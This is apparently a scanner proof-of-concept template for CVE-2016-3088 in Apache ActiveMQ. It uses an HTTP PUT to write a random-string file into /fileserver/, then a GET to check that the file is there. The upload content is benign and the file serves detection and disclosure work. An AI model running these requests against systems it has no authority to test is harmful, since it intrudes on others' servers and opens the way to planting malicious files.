[info]
author = "AVE"
description = "通过 HTTP PUT 向 /fileserver/ 上传文件并验证文件是否成功写入，确认目标存在任意文件上传漏洞"
id = "POC-AVE-2016-0206"
name = "Apache ActiveMQ Fileserver 任意文件上传漏洞 PoC"
severity = "critical"
tags = [
    "cve-2016-3088",
    "activemq",
    "file-upload",
]
vuln_id = [
    "CVE-2016-3088",
    "AVE-2016-0206",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PUT"
path = "/{{BaseURL}}/fileserver/{{randstr_1}}.txt"
protocol = "http"

[poc.requests.body]
content = "{{randstr_1}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/octet-stream"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
    204,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/fileserver/{{randstr_1}}.txt"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["{{randstr_1}}"]
